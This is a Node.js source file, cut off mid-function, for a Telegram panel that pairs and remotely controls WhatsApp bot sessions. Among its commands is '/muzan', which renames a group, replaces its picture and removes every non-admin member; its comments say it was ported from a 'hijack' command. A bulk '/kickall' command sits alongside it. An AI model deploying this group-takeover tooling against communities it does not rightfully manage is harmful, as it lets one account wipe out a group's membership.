require('dotenv').config({ path: require('path').join(__dirname, '..', '.env') });
const fs = require('fs');
const { Telegraf } = require('telegraf');
const store = require('./store');
const { startSession, removeSession, isPaired, isRunning, isConnected, listSavedSessionIds, sendToSelf } = require('../src/session');
const bridge = require('../src/lib/tg-bridge');
const COMMANDS = require('../src/lib/commands.json');
const config = require('../src/config');
const gate = require('./gate');
const { createDoc, notice, sendDoc, editDoc, cb, link, copy, kb, esc, tg } = require('./ui');

const BOT_TOKEN = process.env.BOT_TOKEN;
const OWNER_TELEGRAM_ID = Number(process.env.OWNER_TELEGRAM_ID);
const START_IMAGE_URL = process.env.START_IMAGE_URL || '';
// 'inline' (default): the image is part of the one rich menu message.  'photo': sent as a separate full-size photo above it.
const START_IMAGE_MODE = (process.env.START_IMAGE_MODE || 'inline').toLowerCase();
const CHANNEL_URL = process.env.CHANNEL_URL || 'https://whatsapp.com/channel/0029VaogSY74IBhJWe8b472H';
const GROUP_URL = process.env.GROUP_URL || 'https://chat.whatsapp.com/IroGAENwtIULiuFI5TBDUV';

if (!BOT_TOKEN) {
    console.error('[telegram] Missing BOT_TOKEN in .env');
    process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN);
const startedAt = Date.now();

/**
 * Owner-ID lock. Every update is checked against OWNER_TELEGRAM_ID before any handler runs,
 * so the panel answers one Telegram account and nobody else. Set PANEL_OWNER_ONLY=false in
 * .env to go back to the shared multi-user panel (pairing, reports, broadcast).
 */
const PANEL_OWNER_ONLY = String(process.env.PANEL_OWNER_ONLY || 'true').toLowerCase() !== 'false';

if (PANEL_OWNER_ONLY && !OWNER_TELEGRAM_ID) {
    console.error('[telegram] PANEL_OWNER_ONLY is on but OWNER_TELEGRAM_ID is not set in .env - refusing to start.');
    console.error('[telegram] Send /start to @userinfobot on Telegram to get your numeric ID, or set PANEL_OWNER_ONLY=false.');
    process.exit(1);
}

if (PANEL_OWNER_ONLY) {
    bot.use(async (ctx, next) => {
        const from = ctx.from?.id;
        if (from === OWNER_TELEGRAM_ID) return next();
        // everyone else: one short answer, nothing about the bot, then stop.
        if (ctx.callbackQuery) await ctx.answerCbQuery('Not authorised').catch(() => {});
        else if (ctx.chat) await ctx.reply('This bot is private.').catch(() => {});
        return;
    });
}

const pendingPair = new Map(); // number -> { chatId, messageId } (the "pairing code" message, edited in place)
const awaitingNumber = new Set(); // telegram user ids who pressed "Pair New" and now owe us a number
const awaitingClaim = new Map(); // telegram user id -> { number, code, exp, tries, chatId } (ownership check of an existing session)
const awaitingReport = new Map(); // telegram user id -> timestamp: their NEXT message (anything) goes to the admin
const pendingBroadcasts = new Map(); // token -> payload waiting for the owner's confirmation
const REPORT_WINDOW = 10 * 60 * 1000;

// ---------------------------------------------------------------- helpers

const isBotOwner = (ctx) => !!OWNER_TELEGRAM_ID && ctx.from?.id === OWNER_TELEGRAM_ID;
const canManage = (ctx, s) => !!s && (s.telegramUserId === ctx.from?.id || isBotOwner(ctx));
const validNumber = (n) => /^\d{8,15}$/.test(n);
const digits = (s) => String(s || '').replace(/[^0-9]/g, '');
const argText = (ctx) => (ctx.message?.text || ctx.message?.caption || '').replace(/^\/\w+(@\w+)?\s*/, '');
const dateShort = (ts) => (ts ? new Date(ts).toISOString().slice(0, 10) : '-');
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function uptimeString() {
    const s = Math.floor((Date.now() - startedAt) / 1000);
    return `${Math.floor(s / 3600)}h ${Math.floor((s % 3600) / 60)}m ${s % 60}s`;
}

/** Reply to a COMMAND: the message is streamed ("Loading..." then typed out) before the final send. */
const reply = (ctx, doc, keyboard) => sendDoc(ctx.telegram, ctx.chat.id, doc, { keyboard, stream: true });

/** The start image is sent as a normal photo (full size), then the rich menu follows below it. */
async function sendStartPhoto(ctx) {
    if (!START_IMAGE_URL) return;
    try {
        const src = /^https?:\/\//i.test(START_IMAGE_URL) ? START_IMAGE_URL : fs.existsSync(START_IMAGE_URL) ? { source: fs.createReadStream(START_IMAGE_URL) } : null;
        if (src) await ctx.telegram.sendPhoto(ctx.chat.id, src);
    } catch (err) {
        console.warn('[telegram] start image failed:', err.message);
    }
}

/** Button press: edit the message in place. Command (or message that can't be edited): stream a new one. */
async function show(ctx, doc, keyboard, { photo } = {}) {
    const msg = ctx.callbackQuery?.message;
    if (msg) {
        try {
            await editDoc(ctx.telegram, msg.chat.id, msg.message_id, doc, { keyboard });
            return;
        } catch {
            /* e.g. the old message was a photo - fall through and send a fresh one */
        }
        return sendDoc(ctx.telegram, ctx.chat.id, doc, { keyboard });
    }
    if (photo) await sendStartPhoto(ctx);
    return reply(ctx, doc, keyboard);
}

async function notify(chatId, doc, keyboard) {
    if (!chatId) return;
    try {
        return await sendDoc(bot.telegram, chatId, doc, { keyboard });
    } catch (err) {
        console.error('[telegram] notify failed:', err.message);
    }
}

// remember everyone who opens the bot (broadcast audience)
bot.use((ctx, next) => {
    if (ctx.chat?.type === 'private' && ctx.from && !ctx.from.is_bot) store.touchUser(ctx.from.id, ctx.chat.id, ctx.from.first_name);
    return next();
});

// ---------------------------------------------------------------- must-join gate (channels + group)

const alerted = new Set(); // chats we already warned the owner about

function gateDoc(st, note) {
    const d = createDoc().heading(`${tg('🔒')} Join first to use the bot`, 2);
    d.p(note || 'Please join all of the chats below. Then tap <b>Verify</b> and the bot is yours.');
    const missing = new Set(st.missing.map((c) => c.chat));
    d.table(['Chat', 'Status'], st.required.map((c) => [c.title, missing.has(c.chat) ? '❌ Not joined' : '✅ Joined']));
    return d;
}

function gateKeyboard(st) {
    const rows = st.missing.map((c) => [link(`➕ Join ${c.title}`, c.url, 'primary')]);
    rows.push([cb('✅ I have joined - Verify', 'verify_join', 'success')]);
    return kb(rows);
}

async function warnOwnerAboutUnverifiable(st) {
    if (!OWNER_TELEGRAM_ID) return;
    for (const c of st.unverifiable) {
        if (alerted.has(c.chat)) continue;
        alerted.add(c.chat);
        console.warn(`[gate] cannot verify membership of ${c.chat}: ${c.reason}`);
        await notify(OWNER_TELEGRAM_ID, notice('warn', `Cannot check "${c.title}"`, `Add the bot as an <b>admin</b> of <code>${esc(String(c.chat))}</code> (or fix its id in forcejoin.js). Until then this chat is not enforced.<br/>${esc(c.reason)}`.replace('<br/>', '\n')));
    }
}

if (gate.enabled()) console.log(`[gate] users must join ${gate.required().length} chat(s) before using the bot`);
else console.log('[gate] disabled - fill in telegram-bot/forcejoin.js to require channel/group membership');

bot.use(async (ctx, next) => {
    if (!gate.enabled() || ctx.chat?.type !== 'private' || !ctx.from || isBotOwner(ctx)) return next();
    if (ctx.callbackQuery?.data === 'verify_join') return next();

    const st = await gate.check(ctx.telegram, ctx.from.id).catch(() => null);
    if (!st) return next(); // Telegram hiccup: do not lock anyone out
    warnOwnerAboutUnverifiable(st).catch(() => {});
    if (st.ok) return next();

    if (ctx.callbackQuery) {
        await ctx.answerCbQuery('Join all the chats first, then tap Verify.', { show_alert: true }).catch(() => {});
        return show(ctx, gateDoc(st), gateKeyboard(st));
    }
    return sendDoc(ctx.telegram, ctx.chat.id, gateDoc(st), { keyboard: gateKeyboard(st), stream: true });
});

bot.action('verify_join', async (ctx) => {
    if (!gate.enabled() || isBotOwner(ctx)) {
        await ctx.answerCbQuery().catch(() => {});
        return sendMenu(ctx);
    }
    const st = await gate.check(ctx.telegram, ctx.from.id, { fresh: true }).catch(() => null);
    if (!st) return ctx.answerCbQuery('Could not check right now - try again in a moment.', { show_alert: true }).catch(() => {});
    warnOwnerAboutUnverifiable(st).catch(() => {});

    if (!st.ok) {
        await ctx.answerCbQuery(`Still missing: ${st.missing.map((c) => c.title).join(', ')}`, { show_alert: true }).catch(() => {});
        return show(ctx, gateDoc(st, 'Not all chats joined yet. Join the ones marked ❌, then verify again.'), gateKeyboard(st));
    }
    await ctx.answerCbQuery('Verified ✅').catch(() => {});
    return show(
        ctx,
        notice('ok', 'Verified - welcome!', 'You joined everything. The bot is now unlocked for you.'),
        kb([[cb('➕ Pair New', 'pair_new', 'success'), cb('🏠 Menu', 'menu_home', 'primary')]])
    );
});

// ---------------------------------------------------------------- menu (WhatsApp-style, rich)

function menuDoc() {
    const sessions = Object.values(store.allSessions());
    const online = sessions.filter((s) => s.connected).length;
    const d = createDoc();
    if (START_IMAGE_URL && START_IMAGE_MODE !== 'photo' && /^https?:\/\//i.test(START_IMAGE_URL)) d.image(START_IMAGE_URL);
    d.heading(`${tg('🤖')} ${esc(config.botName)}`, 2);
    d.p('<i>WhatsApp bot control panel</i>');
    d.table(
        null,
        [
            ['Bot Name', config.botName],
            ['Dev', 'jamesmodz'],
            ['Owner', 'James'],
            ['Sessions', `${sessions.length} (${online} online)`],
            ['Uptime', uptimeString()],
            ['Mode', store.isMaintenance() ? 'Maintenance' : 'Active'],
        ],
        'Bot Information'
    );
    d.details('SESSIONS', [
        '<code>/pair 254785016388</code> - link a WhatsApp number',
        '<code>/sessions</code> - your linked numbers',
        '<code>/delsession 254785016388</code> - unlink and delete a number',
    ], true);
    d.details('GENERAL', ['<code>/menu</code> - this screen', '<code>/reportissue</code> - send a problem (text, photo, sticker...) to the admin']);
    d.details('OWNER', ['<code>/broadcast</code> - message everyone (guide inside)', '<code>/maintenance on|off</code> - pause new pairings']);
    return d;
}

const menuKeyboard = () =>
    kb([
        [link('📢 View Channel', CHANNEL_URL, 'success'), link('👥 View Group', GROUP_URL, 'danger')],
        [cb('➕ Pair New', 'pair_new', 'primary'), cb('📋 My Sessions', 'my_sessions', 'primary')],
        [cb('🎛 WhatsApp Commands', 'wa_help', 'primary'), cb('📜 All Commands', 'allcommands', 'primary')],
    ]);

// ---------------------------------------------------------------- whatsapp commands from telegram
//
// Owner-only. The bridge injects the command as the WhatsApp account itself, so anything
// typed here runs with owner rights on the WhatsApp side. Never relax this gate.

const waContext = new Map(); // telegram chat id -> { number, jid, subject }
const pendingKick = new Map(); // token -> { number, jid, subject, command }
const pendingMuzan = new Map(); // token -> { number, jid, subject, name }
const KICKALL_RE = /^(kick|remove)[\s-]+all\b|^(kickall|removeall)\b/i;

function ownerGate(ctx) {
    if (isBotOwner(ctx)) return true;
    reply(ctx, notice('error', 'Owner only', 'Running WhatsApp commands is limited to the panel owner.'));
    return false;
}

bot.action('wa_help', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    if (!isBotOwner(ctx)) return show(ctx, notice('error', 'Owner only', 'WhatsApp control is limited to the panel owner.'));
    const list = store.sessionsForUser(ctx.from.id);
    const d = createDoc();
    d.heading(`${tg('🎛')} WhatsApp commands`, 2);
    d.p('No number needed. Send <code>/muzan</code> or <code>/kickall</code> and the online session is picked for you - then tap the group.');
    d.p('<code>/muzan</code> renames the group, changes its picture, then removes every non-admin.');
    d.p('<code>/kickall</code> removes non-admin members only. <code>/setdp</code> changes the account picture only.');
    d.p('Other commands, no prefix: <code>ping</code> &middot; <code>tagall hello</code> &middot; <code>open</code> &middot; <code>close</code> &middot; <code>admins</code> &middot; <code>gcinfo</code>');
    d.p('<i>Commands run as the WhatsApp account itself, so owner and admin rules apply exactly as they do in WhatsApp.</i>');
    const rows = list.length ? list.map((s) => [cb(`👥 ${s.number}`, `wagpick:${s.number}`, 'primary')]) : [[cb('➕ Pair New', 'pair_new', 'success')]];
    rows.push([cb('🏠 Menu', 'menu_home')]);
    return show(ctx, d, kb(rows));
});

/**
 * Which WhatsApp number to act as. The owner should never have to type it: with one session
 * online there is nothing to choose, so it is picked silently. Several online sessions are
 * offered as buttons. An explicit number in the command still overrides everything.
 */
async function resolveNumber(ctx, tag, explicit) {
    const given = digits(explicit || '');
    if (given) {
        waContext.set(ctx.chat.id, { number: given, jid: null, subject: null });
        return given;
    }
    const remembered = waContext.get(ctx.chat.id)?.number;
    if (remembered) return remembered;

    const live = bridge.runningSessions();
    if (live.length === 1) {
        waContext.set(ctx.chat.id, { number: live[0], jid: null, subject: null });
        return live[0];
    }
    if (!live.length) {
        await reply(ctx, notice('error', 'No session online', 'Pair a number with /pair, wait until it shows 🟢 Online, then try again.'));
        return null;
    }
    const rows = live.map((n) => [cb(`👥 ${n}`, `was:${tag}:${n}`, 'primary')]);
    rows.push([cb('🏠 Menu', 'menu_home')]);
    await show(ctx, notice('info', 'Which number?', `${live.length} sessions are online. Pick the one to act as, then send the command again.`), kb(rows));
    return null;
}

bot.action(/^was:(\w+):(\d+)$/, async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    if (!isBotOwner(ctx)) return;
    const number = ctx.match[2];
    waContext.set(ctx.chat.id, { number, jid: null, subject: null });
    return show(ctx, notice('ok', 'Number set', `<code>${esc(number)}</code>\n\nSend the command again, e.g. <code>/muzan</code>`), kb([[cb('🏠 Menu', 'menu_home')]]));
});

async function showGroupPicker(ctx, number) {
    if (!ownerGate(ctx)) return;
    if (!validNumber(number)) {
        return reply(ctx, notice('info', 'Usage', 'Send <code>/groups 2547XXXXXXXX</code>\nYour paired WhatsApp number, digits only.'));
    }
    let groups;
    try {
        groups = await bridge.listGroups(number, { adminOnly: true });
    } catch (err) {
        return reply(ctx, notice('error', 'Could not read groups', esc(err.message)));
    }
    if (!groups.length) {
        return reply(
            ctx,
            notice('warn', 'No admin groups', `The bot is not an admin in any group on <code>${esc(number)}</code>.\nMake it admin in that group first.`)
        );
    }
    const rows = groups.slice(0, 40).map((g) => [cb(String(g.subject).slice(0, 50), `wag:${number}:${g.jid}`, 'primary')]);
    rows.push([cb('🏠 Menu', 'menu_home')]);
    return show(ctx, notice('info', 'Pick a group', `${groups.length} group(s) where <code>${esc(number)}</code> is admin.`), kb(rows));
}

// ---------------------------------------------------------------- the flat command list
//
// One list, one button per command - no category tabs. The list is generated from the
// dispatcher itself (src/lib/commands.json), so it cannot drift from what actually exists.

async function showCommands(ctx) {
    const names = COMMANDS.map((c) => c.name);
    const d = createDoc();
    d.heading(`${tg('📜')} ${names.length} commands`, 2);
    d.p(names.map((n) => `<code>${esc(n)}</code>`).join(' · '));
    d.p('<i>Tap a command to see how to run it.</i>');
    const rows = [];
    for (let i = 0; i < COMMANDS.length; i += 3) {
        rows.push(COMMANDS.slice(i, i + 3).map((c) => cb(c.name, `ci:${c.name}`, 'primary')));
    }
    rows.push([cb('🏠 Menu', 'menu_home')]);
    return show(ctx, d, kb(rows));
}

bot.command(['commands', 'allcommands'], async (ctx) => {
    if (!ownerGate(ctx)) return;
    return showCommands(ctx);
});

bot.action('allcommands', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    if (!isBotOwner(ctx)) return;
    return showCommands(ctx);
});

bot.action(/^ci:(.+)$/, async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    if (!isBotOwner(ctx)) return;
    const name = ctx.match[1];
    const entry = COMMANDS.find((c) => c.name === name);
    const inGroup = entry && entry.category === 'GROUP';
    const body = [
        `Category: <b>${esc(entry?.category || 'unknown')}</b>`,
        '',
        `WhatsApp: <code>${esc(name)}</code>${inGroup ? ' (inside the group)' : ''}`,
        `Telegram: type <code>${esc(name)}</code> after picking a target with /groups.`,
        entry?.category === 'ALIAS' ? '<i>Alias of another command - same behaviour.</i>' : '',
    ]
        .filter(Boolean)
        .join('\n');
    return show(ctx, notice('info', name, body), kb([[cb('⬅ All commands', 'allcommands', 'primary'), cb('🏠 Menu', 'menu_home')]]));
});

bot.command('groups', async (ctx) => {
    if (!ownerGate(ctx)) return;
    const number = await resolveNumber(ctx, 'groups', argText(ctx));
    if (!number) return;
    return showGroupPicker(ctx, number);
});

bot.action(/^wag:(\d+):(.+)$/, async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    if (!isBotOwner(ctx)) return;
    const number = ctx.match[1];
    const jid = ctx.match[2];
    let subject = jid;
    try {
        subject = (await bridge.groupInfo(number, jid)).subject;
    } catch {
        /* keep the jid as the label */
    }
    waContext.set(ctx.chat.id, { number, jid, subject });
    return show(
        ctx,
        notice(
            'ok',
            'Target set',
            `Session <code>${esc(number)}</code>\nGroup <b>${esc(subject)}</b>\n\nNow type any command: <code>kick all</code>, <code>ping</code>, <code>tagall hello</code> ...`
        ),
        kb([[cb('👥 Change group', `wagpick:${number}`, 'primary')], [cb('🏠 Menu', 'menu_home')]])
    );
});

bot.action(/^wagpick:(\d+)$/, async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    return showGroupPicker(ctx, ctx.match[1]);
});

bot.command('ping', async (ctx) => {
    if (!ownerGate(ctx)) return;
    const number = await resolveNumber(ctx, 'ping', argText(ctx));
    if (!number) return;
    const started = Date.now();
    let online = false;
    try {
        online = bridge.isOnline(number);
    } catch {
        /* offline */
    }
    return reply(ctx, notice(online ? 'ok' : 'error', `Ping ${number}`, online ? `Online · ${Date.now() - started}ms` : 'Not connected. Start it from /sessions.'));
});

/**
 * /setdp [number] - set the WhatsApp account's own profile picture to the bundled artwork.
 * The Telegram twin of the WhatsApp-side .setdp command, which needs a quoted image instead.
 */
bot.command('setdp', async (ctx) => {
    if (!ownerGate(ctx)) return;
    const number = await resolveNumber(ctx, 'setdp', argText(ctx));
    if (!number) return;
    try {
        const res = await bridge.setProfilePicture(number);
        await ctx.telegram.sendPhoto(ctx.chat.id, { source: res.file }, { caption: `✅ Profile picture set for ${number} (${Math.round(res.bytes / 1024)} KB)` });
        return;
    } catch (err) {
        return reply(ctx, notice('error', 'Could not set the picture', esc(err.message)));
    }
});

/**
 * /muzan <number> [new group name] - the three-step takeover:
 * rename the group, replace its picture, then remove every non-admin member.
 * Ported from the Blacklord bot's `hijack` command, with a confirmation step and admins kept.
 */
async function startMuzan(ctx, number, name, preferredJid) {
    if (!ownerGate(ctx)) return;
    if (!validNumber(number)) {
        return reply(ctx, notice('info', 'Usage', 'Send <code>/muzan 254729632649</code>\nOptional name: <code>/muzan 254729632649 New Group Name</code>'));
    }
    let groups;
    try {
        groups = await bridge.listGroups(number, { adminOnly: true });
    } catch (err) {
        return reply(ctx, notice('error', 'Cannot reach that number', esc(err.message)));
    }
    if (!groups.length) {
        return reply(ctx, notice('warn', 'Not admin anywhere', `<code>${esc(number)}</code> is not an admin in any group.\nMake it admin first.`));
    }

    const current = waContext.get(ctx.chat.id);
    const chosen =
        (current && current.number === number && groups.find((g) => g.jid === current.jid)) ||
        (preferredJid && groups.find((g) => g.jid === preferredJid)) ||
        (groups.length === 1 ? groups[0] : null);

    if (!chosen) {
        const rows = groups.slice(0, 40).map((g) => [cb(String(g.subject).slice(0, 50), `wagm:${number}:${g.jid}`, 'danger')]);
        rows.push([cb('🏠 Menu', 'menu_home')]);
        return show(ctx, notice('info', 'Which group?', `<code>${esc(number)}</code> is admin in ${groups.length} groups. Pick the one to take over.`), kb(rows));
    }

    let info;
    try {
        info = await bridge.previewMuzan(number, chosen.jid);
    } catch (err) {
        return reply(ctx, notice('error', 'Could not read the group', esc(err.message)));
    }

    const token = `${Date.now().toString(36)}${Math.random().toString(36).slice(2, 6)}`;
    pendingMuzan.set(token, { number, jid: chosen.jid, subject: info.subject, name });
    return reply(
        ctx,
        notice(
            'warn',
            'Muzan takeover',
            `Group <b>${esc(info.subject)}</b>\n\n1. Rename to <b>${esc(info.newName)}</b>\n2. Replace the group picture${info.imageOk ? '' : ' ⚠️ image missing'}\n3. Remove <b>${info.removable}</b> of ${info.total} members (${info.admins} admin(s) kept)\n\n<i>No undo.</i>`
        ),
        kb([[cb('💀 Run muzan', `wam:${token}`, 'danger'), cb('✖ Cancel', 'menu_home', 'primary')]])
    );
}

bot.command('muzan', async (ctx) => {
    if (!ownerGate(ctx)) return;
    const parts = argText(ctx).trim().split(/\s+/).filter(Boolean);
    let explicit = '';
    if (parts[0] && /^\d{8,15}$/.test(parts[0])) explicit = parts.shift();
    const number = await resolveNumber(ctx, 'muzan', explicit);
    if (!number) return;
    return startMuzan(ctx, number, parts.join(' ').trim());
});

bot.action(/^wagm:(\d+):(.+)$/, async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    if (!isBotOwner(ctx)) return;
    return startMuzan(ctx, ctx.match[1], '', ctx.match[2]);
});

bot.action(/^wam:(.+)$/, async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    if (!isBotOwner(ctx)) return;
    const job = pendingMuzan.get(ctx.match[1]);
    pendingMuzan.delete(ctx.match[1]);
    if (!job) return show(ctx, notice('error', 'Expired', 'Send the command again.'));

    await reply(ctx, notice('wait', 'Muzan running', `Renaming, repainting and clearing <b>${esc(job.subject)}</b> ...`));
    try {
        const r = await bridge.runMuzan(job.number, job.jid, job.name);
        const lines = [
            `Group: ${r.subject}`,
            r.nameUpdated ? `Renamed to: ${r.newName}` : 'Rename failed',
            r.pictureUpdated ? 'Picture updated' : 'Picture not updated',
            `Removed: ${r.removed} · Failed: ${r.failed} · Admins kept: ${r.keptAdmins}`,
        ];
        if (r.errors.length) lines.push('', ...r.errors.slice(0, 5));
        return reply(ctx, notice('ok', 'Muzan done', esc(lines.join('\n'))));
    } catch (err) {
        return reply(ctx, notice('error', 'Failed', esc(err.message)));
    }
});

async function confirmKickAll(ctx, target, command) {
    let info;
    try {
        info = await bridge.previewKick(target.number, target.jid);
    } catch (err) {
        return reply(ctx, notice('error', 'Could not read the group', esc(err.message)));
    }
    if (!info.removable) return reply(ctx, notice('info', 'Nothing to remove', 'Every member is an admin, the owner, or me.'));
    const token = `${Date.now().toString(36)}${Math.random().toString(36).slice(2, 6)}`;
    pendingKick.set(token, { ...target, command });
    return reply(
        ctx,
        notice(
            'warn',
            'Remove ALL members?',
            `Group <b>${esc(info.subject)}</b>\nRemove <b>${info.removable}</b> of ${info.total} member(s)\nKept: admins, owner, sudo and me.\n\n<i>Paced ~1.2s per member - large groups take a few minutes.</i>`
        ),
        kb([[cb('✅ Kick all', `wak:${token}`, 'danger'), cb('✖ Cancel', 'menu_home', 'primary')]])
    );
}

/**
 * /kickall <number> - the number is the WhatsApp account that is admin in the target group.
 * The group itself is resolved in this order: the one already picked in this chat, the one
 * named by the button that got us here, then the only admin group if there is exactly one.
 * Anything else falls back to a picker, so the command never guesses at a destructive action.
 */
async function startKickAll(ctx, number, preferredJid) {
    if (!ownerGate(ctx)) return;
    if (!validNumber(number)) {
        return reply(ctx, notice('info', 'Usage', 'Send <code>/kickall 254729632649</code>\nThat is the WhatsApp number which is admin in the group.'));
    }
    let groups;
    try {
        groups = await bridge.listGroups(number, { adminOnly: true });
    } catch (err) {
        return reply(ctx, notice('error', 'Cannot reach that number', esc(err.message)));
    }
    if (!groups.length) {
        return reply(ctx, notice('warn', 'Not admin anywhere', `<code>${esc(number)}</code> is not an admin in any group.\nMake it admin in the group first.`));
    }

    const current = waContext.get(ctx.chat.id);
    const chosen =
        (current && current.number === number && groups.find((g) => g.jid === current.jid)) ||
        (preferredJid && groups.find((g) => g.jid === preferredJid)) ||
        (groups.length === 1 ? groups[0] : null);

    if (!chosen) {
        const rows = groups.slice(0, 40).map((g) => [cb(String(g.subject).slice(0, 50), `wagk:${number}:${g.jid}`, 'danger')]);
        rows.push([cb('🏠 Menu', 'menu_home')]);
        return show(ctx, notice('info', 'Which group?', `<code>${esc(number)}</code> is admin in ${groups.length} groups. Pick the one to empty.`), kb(rows));
    }

    waContext.set(ctx.chat.id, { number, jid: chosen.jid, subject: chosen.subject });
    return confirmKickAll(ctx, { number, jid: chosen.jid, subject: chosen.subject }, 'kickall');
}

bot.command('kickall', async (ctx) => {
    if (!ownerGate(ctx)) return;
    const number = await resolveNumber(ctx, 'kickall', argText(ctx));
    if (!number) return;
    return startKickAll(ctx, number);
});

bot.action(/^wagk:(\d+):(.+)$/, async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    if (!isBotOwner(ctx)) return;
    return startKickAll(ctx, ctx.match[1], ctx.match[2]);
});

bot.action(/^wak:(.+)$/, async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    if (!isBotOwner(ctx)) return;
    const job = pendingKick.get(ctx.match[1]);
    pendingKick.delete(ctx.match[1]);
    if (!job) return show(ctx, notice('error', 'Expired', 'Send the command again.'));
    await reply(ctx, notice('wait', 'Kicking everyone', `Running on <b>${esc(job.subject)}</b> ...`));
    try {
        const out = await bridge.execute(job.number, job.jid, `${job.command} confirm`);
        return reply(ctx, notice('ok', 'Kick all', out.join('\n\n') || '<i>Done.</i>'));
    } catch (err) {
        return reply(ctx, notice('error', 'Failed', esc(err.message)));
    }
});

/** Any plain text in a chat that has a target set is treated as a WhatsApp command. */
async function runWaCommand(ctx, text) {
    const target = waContext.get(ctx.chat.id);
    const command = String(text || '').trim();
    if (!command) return;
    if (!ownerGate(ctx)) return;

    // "kick all 254729632649" works from any chat, with or without a group already picked
    if (KICKALL_RE.test(command)) {
        const number = digits(command) || target?.number || '';
        return startKickAll(ctx, number, target?.jid);
    }

    if (!target) return;
    if (!target.jid) return reply(ctx, notice('info', 'No group selected', `Send <code>/groups ${esc(target.number)}</code> and pick one.`));

    try {
        const out = await bridge.execute(target.number, target.jid, command);
        return reply(ctx, notice('ok', command, out.length ? out.join('\n\n') : '<i>Ran, no output.</i>'));
    } catch (err) {
        return reply(ctx, notice('error', 'Command failed', esc(err.message)));
    }
}

const sendMenu = (ctx) => show(ctx, menuDoc(), menuKeyboard(), { photo: START_IMAGE_MODE === 'photo' });

bot.start(sendMenu);
bot.command(['menu', 'help'], sendMenu);
bot.action('menu_home', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    awaitingNumber.delete(ctx.from.id);
    return sendMenu(ctx);
});

// ---------------------------------------------------------------- sessions (table)

async function showSessions(ctx, headline) {
    const list = store.sessionsForUser(ctx.from.id);
    if (!list.length) {
        const d = notice('info', 'No sessions yet', 'Link your first WhatsApp number to get started.');
        return show(ctx, d, kb([[cb('➕ Pair New', 'pair_new', 'success'), cb('🏠 Menu', 'menu_home', 'primary')]]));
    }
    const d = createDoc();
    if (headline) d.p(headline);
    d.heading(`${tg('📊')} Your sessions`, 2);
    d.table(
        ['#', 'Number', 'Status', 'Linked'],
        list.map((s, i) => [String(i + 1), s.number, s.connected && isRunning(s.number) ? '🟢 Online' : '🟡 Connecting', dateShort(s.connectedAt || s.createdAt)])
    );
    d.p(`<i>${list.length} session${list.length > 1 ? 's' : ''} - tap a number below to delete it.</i>`);
    const rows = list.map((s) => [cb(`🗑 Delete ${s.number}`, `del:${s.number}`, 'danger')]);
    rows.push([cb('➕ Pair New', 'pair_new', 'success'), cb('🔄 Refresh', 'my_sessions', 'primary')]);
    rows.push([cb('🏠 Menu', 'menu_home')]);
    return show(ctx, d, kb(rows));
}

bot.command('sessions', (ctx) => showSessions(ctx));
bot.action('my_sessions', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    return showSessions(ctx);
});

// ---------------------------------------------------------------- pairing

function codeDoc(number, code) {
    const formatted = code.match(/.{1,4}/g).join('-');
    return createDoc()
        .heading(`${tg('🔑')} Pairing code`, 2)
        .p(`For <code>${esc(number)}</code>`)
        .p(`<b><code>${esc(formatted)}</code></b>`)
        .list(['Tap <b>Copy Code</b> below', 'Open WhatsApp → <b>Linked Devices</b> → <b>Link with phone number instead</b>', 'Paste the code within ~60 seconds'], true)
        .quote('This message updates by itself when the number connects.');
}

function connectedDoc(number) {
    return createDoc()
        .p(`${tg('✅')} <b>Connected successfully</b>`)
        .table(null, [['Number', number], ['Status', '🟢 Online'], ['Next', 'Send .menu on WhatsApp']]);
}
const connectedKeyboard = () => kb([[cb('📋 My Sessions', 'my_sessions', 'primary'), cb('🏠 Menu', 'menu_home', 'success')]]);

/** Callbacks wiring one WhatsApp session to its Telegram owner (works for fresh pairs AND restored sessions). */
function sessionCallbacks(number, { restored = false } = {}) {
    const chatOf = () => store.getSession(number)?.telegramChatId;

    const cleanup = async () => {
        pendingPair.delete(number);
        await removeSession(number).catch(() => {});
        store.deleteSession(number);
    };

    return {
        pairingNumber: number,
        restored,

        onPairingCode: async (code) => {
            const p = pendingPair.get(number);
            if (!p) return;
            // one button only: copy the pairing code straight to the clipboard
            const keyboard = kb([[copy('📋 Copy Code', code, 'success')]]);
            await editDoc(bot.telegram, p.chatId, p.messageId, codeDoc(number, code), { keyboard }).catch(() =>
                notify(p.chatId, codeDoc(number, code), keyboard)
            );
        },

        onPairingError: async (err) => {
            const chatId = chatOf();
            await cleanup();
            const limited = /429|rate/i.test(err.message);
            await notify(
                chatId,
                notice('error', 'Could not get a pairing code', esc(limited ? 'WhatsApp rate-limited this number. Wait a few minutes, then try again.' : err.message)),
                kb([[cb('🔁 Try again', 'pair_new', 'primary'), cb('🏠 Menu', 'menu_home')]])
            );
        },

        onPairingFailed: async () => {
            const chatId = chatOf();
            await cleanup();
            await notify(
                chatId,
                notice('warn', 'Pairing expired', `The code for <code>${esc(number)}</code> was not used in time. The unfinished session was removed.`),
                kb([[cb('🔁 Pair again', 'pair_new', 'success'), cb('🏠 Menu', 'menu_home')]])
            );
        },

        onConnected: async (isFirstTime) => {
            if (!store.getSession(number)) return; // deleted while connecting
            store.setSession(number, { connected: true, connectedAt: Date.now() });
            const p = pendingPair.get(number);
            pendingPair.delete(number);
            if (!isFirstTime) return; // restarts / reconnects stay silent
            const doc = connectedDoc(number);
            if (p) {
                try {
                    await editDoc(bot.telegram, p.chatId, p.messageId, doc, { keyboard: connectedKeyboard() });
                    return;
                } catch {
                    /* send a fresh message below */
                }
            }
            await notify(chatOf() || p?.chatId, doc, connectedKeyboard());
        },

        onDisconnected: () => {
            if (store.getSession(number)) store.setSession(number, { connected: false });
        },

        // the same login is running somewhere else too: this copy stopped itself, files are kept
        onReplaced: async () => {
            if (store.getSession(number)) store.setSession(number, { connected: false });
            await notify(
                chatOf(),
